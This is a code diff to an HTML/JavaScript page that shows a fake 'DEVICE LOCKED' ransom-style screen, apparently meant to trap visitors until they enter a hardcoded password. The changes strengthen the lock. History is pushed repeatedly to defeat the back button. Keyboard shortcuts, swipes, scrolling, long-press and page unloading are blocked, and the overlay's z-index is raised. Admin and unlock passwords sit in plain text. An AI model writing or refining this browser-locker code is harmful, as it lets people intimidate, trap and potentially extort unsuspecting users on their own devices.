@@ -22,9 +22,10 @@
             position: fixed;
             width: 100%;
             height: 100%;
+            touch-action: none;
         }
 
-        /* LOCK SCREEN */
+        /* LOCK SCREEN - FULL BLOCK */
         .lock-screen {
             position: fixed;
             top: 0;
@@ -32,13 +33,14 @@
             width: 100%;
             height: 100%;
             background: radial-gradient(circle at 30% 30%, #0a0f2a, #000000);
-            z-index: 9999;
+            z-index: 99999;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             text-align: center;
             padding: 25px;
+            touch-action: none;
         }
 
         .skull {
@@ -117,6 +119,8 @@
             padding: 20px;
             height: 100vh;
             overflow-y: auto;
+            position: relative;
+            z-index: 1;
         }
 
         .admin-header {
@@ -202,6 +206,8 @@
             font-family: monospace;
             font-size: 14px;
             font-weight: bold;
+            background: transparent;
+            padding: 0;
         }
 
         .device-info .status {
@@ -249,7 +255,7 @@
             font-weight: bold;
         }
 
-        /* Unlock Password Modal */
+        /* Password Modal */
         .password-modal {
             display: none;
             position: fixed;
@@ -258,7 +264,7 @@
             width: 100%;
             height: 100%;
             background: rgba(0,0,0,0.98);
-            z-index: 3000;
+            z-index: 100000;
             justify-content: center;
             align-items: center;
         }
@@ -313,18 +319,22 @@
             display: none;
         }
 
-        /* Admin Login Modal */
-        .admin-login-modal {
-            display: none;
+        /* Success Message */
+        .success-toast {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.98);
-            z-index: 4000;
-            justify-content: center;
-            align-items: center;
+            bottom: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #4CAF50;
+            color: white;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            z-index: 200000;
+            display: none;
+            white-space: nowrap;
+            box-shadow: 0 0 20px rgba(76,175,80,0.5);
         }
     </style>
 </head>
@@ -332,12 +342,12 @@
 
     <!-- LOCK SCREEN -->
     <div id="lockScreen" class="lock-screen">
-        <div class="skull" id="skullBtn" onclick="showUnlockPopup()">💀</div>
+        <div class="skull" id="skullBtn">💀</div>
         <h1>DEVICE LOCKED</h1>
         <div class="sub">This device has been remotely locked</div>
         <div class="message-box">
             <div class="label">🔒 DEVICE ID</div>
-            <div class="device-id" id="lockedDeviceId" onclick="showUnlockPopup()">----</div>
+            <div class="device-id" id="lockedDeviceId">----</div>
         </div>
         <div class="footer">⚠️ Tap on skull or device ID to unlock</div>
     </div>
@@ -372,32 +382,25 @@
         </div>
     </div>
 
-    <!-- UNLOCK PASSWORD MODAL (for user) -->
-    <div id="unlockModal" class="password-modal">
+    <!-- PASSWORD MODAL -->
+    <div id="passwordModal" class="password-modal">
         <div class="password-box">
             <div style="font-size: 50px; margin-bottom: 10px;">🔐</div>
             <h2>ENTER PASSWORD</h2>
-            <input type="password" id="unlockPassInput" maxlength="6" placeholder="******" autocomplete="off">
-            <button onclick="verifyUserUnlock()">UNLOCK</button>
-            <button class="cancel" onclick="closeUnlockModal()">CANCEL</button>
-            <div id="unlockError" class="pass-error">❌ Wrong password!</div>
+            <input type="password" id="unlockPassword" maxlength="6" placeholder="******" autocomplete="off">
+            <button onclick="verifyPassword()">UNLOCK</button>
+            <button class="cancel" onclick="closePasswordModal()">CANCEL</button>
+            <div id="passError" class="pass-error">❌ Wrong password!</div>
         </div>
     </div>
 
-    <!-- ADMIN LOGIN MODAL -->
-    <div id="adminLoginModal" class="admin-login-modal">
-        <div class="password-box">
-            <h2>👑 ADMIN LOGIN</h2>
-            <input type="password" id="adminPassInput" placeholder="Enter password" autocomplete="off">
-            <button onclick="verifyAdminLogin()">LOGIN</button>
-            <div id="adminError" class="pass-error">❌ Wrong password!</div>
-        </div>
-    </div>
+    <!-- SUCCESS TOAST -->
+    <div id="successToast" class="success-toast">✅ UNLOCK SUCCESSFUL!</div>
 
     <script>
         // ========== PASSWORDS ==========
         const ADMIN_PASSWORD = "8708250548";
-        const USER_UNLOCK_PASSWORD = "809080";  // 6-digit password for user to unlock
+        const UNLOCK_PASSWORD = "809080";
         
         // ========== DATA ==========
         let lockedDevices = JSON.parse(localStorage.getItem('ransome_devices') || '[]');
@@ -461,34 +464,41 @@
             document.getElementById('newDeviceId').value = '';
         }
 
-        // ========== USER UNLOCK (from lock screen) ==========
-        function showUnlockPopup() {
-            document.getElementById('unlockModal').style.display = 'flex';
-            document.getElementById('unlockPassInput').value = '';
-            document.getElementById('unlockError').style.display = 'none';
+        // ========== SHOW PASSWORD MODAL ==========
+        function showPasswordModal() {
+            document.getElementById('passwordModal').style.display = 'flex';
+            document.getElementById('unlockPassword').value = '';
+            document.getElementById('passError').style.display = 'none';
         }
 
-        function closeUnlockModal() {
-            document.getElementById('unlockModal').style.display = 'none';
+        function closePasswordModal() {
+            document.getElementById('passwordModal').style.display = 'none';
         }
 
-        function verifyUserUnlock() {
-            const enteredPass = document.getElementById('unlockPassInput').value;
+        // ========== VERIFY PASSWORD & EXIT ==========
+        function verifyPassword() {
+            const enteredPass = document.getElementById('unlockPassword').value;
             
-            if (enteredPass === USER_UNLOCK_PASSWORD) {
-                closeUnlockModal();
-                // Remove current device from lock list
+            if (enteredPass === UNLOCK_PASSWORD) {
+                closePasswordModal();
+                
+                // Show success message
+                const toast = document.getElementById('successToast');
+                toast.style.display = 'block';
+                
+                // Remove device from lock list
                 if (currentDeviceId) {
                     lockedDevices = lockedDevices.filter(d => d.id !== currentDeviceId);
                     saveDevices();
                 }
-                alert('✅ Device unlocked successfully! Closing browser...');
+                
+                // Auto exit after 1 second
                 setTimeout(() => {
                     window.close();
                     window.location.href = 'about:blank';
-                }, 500);
+                }, 1000);
             } else {
-                document.getElementById('unlockError').style.display = 'block';
+                document.getElementById('passError').style.display = 'block';
             }
         }
 
@@ -503,7 +513,7 @@
             lockedDevices = lockedDevices.filter(d => d.id !== deviceId);
             saveDevices();
             
-            alert(`✅ Device ${deviceId} has been UNLOCKED! Browser will close.`);
+            alert(`✅ Device ${deviceId} has been UNLOCKED!`);
             
             if (currentDeviceId === deviceId) {
                 setTimeout(() => {
@@ -515,24 +525,14 @@
 
         // ========== ADMIN FUNCTIONS ==========
         function showAdminLogin() {
-            document.getElementById('adminLoginModal').style.display = 'flex';
-            document.getElementById('adminPassInput').value = '';
-            document.getElementById('adminError').style.display = 'none';
-        }
-
-        function closeAdminLoginModal() {
-            document.getElementById('adminLoginModal').style.display = 'none';
-        }
-
-        function verifyAdminLogin() {
-            const pass = document.getElementById('adminPassInput').value;
-            if (pass === ADMIN_PASSWORD) {
+            const password = prompt("🔐 ADMIN LOGIN\n\nEnter Password:");
+            if (password === ADMIN_PASSWORD) {
                 isAdminLoggedIn = true;
                 localStorage.setItem('ransome_admin', 'true');
-                closeAdminLoginModal();
                 showAdminPanel();
-            } else {
-                document.getElementById('adminError').style.display = 'block';
+            } else if (password !== null) {
+                alert("❌ Wrong Password!");
+                showAdminLogin();
             }
         }
 
@@ -553,52 +553,69 @@
             document.getElementById('lockScreen').style.display = 'flex';
             document.getElementById('lockedDeviceId').innerText = deviceId;
             
+            // Lock body completely
             document.body.style.overflow = 'hidden';
             document.body.style.position = 'fixed';
-            window.history.pushState(null, '', window.location.href);
+            
+            // Push history - prevent back
+            for(let i = 0; i < 10; i++) {
+                window.history.pushState(null, '', window.location.href);
+            }
         }
 
-        // ========== TRAP USER - NO EXIT ==========
-        window.addEventListener('popstate', function() {
+        // ========== COMPLETE TRAP - NO EXIT ANYWAY ==========
+        // Block all navigation
+        window.addEventListener('popstate', function(e) {
             if (currentDeviceId) {
-                window.history.pushState(null, '', window.location.href);
-                alert('🔒 DEVICE LOCKED! Tap on skull to unlock with password.');
+                for(let i = 0; i < 10; i++) {
+                    window.history.pushState(null, '', window.location.href);
+                }
+                return;
             }
         });
 
+        // Block beforeunload
         window.addEventListener('beforeunload', function(e) {
             if (currentDeviceId) {
                 e.preventDefault();
-                e.returnValue = '🔒 DEVICE IS LOCKED!';
-                return '🔒 DEVICE IS LOCKED!';
+                e.returnValue = '🔒 DEVICE LOCKED! Tap on skull to unlock.';
+                return '🔒 DEVICE LOCKED! Tap on skull to unlock.';
             }
         });
 
+        // Block all keyboard shortcuts
         document.addEventListener('keydown', function(e) {
             if (currentDeviceId) {
-                const blocked = ['F5', 'F12', 'Escape', 'Home', 'Backspace', 'ArrowLeft', 'ArrowRight', 'Meta', 'Alt', 'Tab'];
-                if (blocked.includes(e.key) || (e.ctrlKey && (e.key === 'r' || e.key === 'w' || e.key === 'q'))) {
+                const blocked = ['F5', 'F12', 'Escape', 'Home', 'Backspace', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Meta', 'Alt', 'Tab', 'PageUp', 'PageDown'];
+                if (blocked.includes(e.key) || (e.ctrlKey && (e.key === 'r' || e.key === 'w' || e.key === 'q' || e.key === 't')) || (e.altKey && e.key === 'ArrowLeft')) {
                     e.preventDefault();
-                    alert('🔒 Action blocked! Tap on skull to unlock.');
+                    e.stopPropagation();
                     return false;
                 }
             }
         });
 
-        let startX = 0;
+        // Block all touch gestures (swipe, pull to refresh)
+        let touchStartX = 0, touchStartY = 0;
         document.addEventListener('touchstart', function(e) {
-            if (currentDeviceId) startX = e.touches[0].clientX;
+            if (currentDeviceId) {
+                touchStartX = e.touches[0].clientX;
+                touchStartY = e.touches[0].clientY;
+                e.preventDefault();
+            }
+        });
+        document.addEventListener('touchmove', function(e) {
+            if (currentDeviceId) {
+                e.preventDefault();
+            }
         });
         document.addEventListener('touchend', function(e) {
             if (currentDeviceId) {
-                const endX = e.changedTouches[0].clientX;
-                if (Math.abs(endX - startX) > 50) {
-                    e.preventDefault();
-                    alert('🔒 Swipe blocked! Tap on skull to unlock.');
-                }
+                e.preventDefault();
             }
         });
 
+        // Block context menu (long press)
         document.addEventListener('contextmenu', function(e) {
             if (currentDeviceId) {
                 e.preventDefault();
@@ -606,12 +623,20 @@
             }
         });
 
+        // Block wheel/scroll
+        document.addEventListener('wheel', function(e) {
+            if (currentDeviceId) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+
+        // Continuously push history
         if (currentDeviceId) {
             setInterval(() => {
                 if (currentDeviceId) {
                     window.history.pushState(null, '', window.location.href);
                 }
-            }, 500);
+            }, 200);
         }
 
         // ========== INIT ==========
@@ -638,15 +663,18 @@
             }
         }
 
+        // Make functions global
         window.adminLogout = adminLogout;
         window.addDevice = addDevice;
         window.forceUnlockDevice = forceUnlockDevice;
-        window.showUnlockPopup = showUnlockPopup;
-        window.closeUnlockModal = closeUnlockModal;
-        window.verifyUserUnlock = verifyUserUnlock;
+        window.showPasswordModal = showPasswordModal;
+        window.closePasswordModal = closePasswordModal;
+        window.verifyPassword = verifyPassword;
         window.showAdminLogin = showAdminLogin;
-        window.verifyAdminLogin = verifyAdminLogin;
-        window.closeAdminLoginModal = closeAdminLoginModal;
+
+        // Attach click events to skull and device ID
+        document.getElementById('skullBtn')?.addEventListener('click', showPasswordModal);
+        document.getElementById('lockedDeviceId')?.addEventListener('click', showPasswordModal);
 
         if (isAdminLoggedIn) {
             showAdminPanel();
